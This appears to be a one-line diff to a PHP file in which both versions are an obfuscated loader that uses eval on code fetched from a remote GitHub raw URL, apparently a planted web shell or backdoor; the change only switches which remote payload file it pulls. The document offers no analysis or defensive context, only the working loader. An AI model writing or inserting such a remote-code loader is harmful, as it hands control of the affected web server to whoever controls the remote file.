@@ -1,1 +1,1 @@
-<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/z4phy-mini/z4p-c0de-compres.php"))/******/ /*Z4PHY-C0DE*/?>
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/z4phy-mini/z4p-c0de.php"))/******/ /*Z4PHY-C0DE*/?>
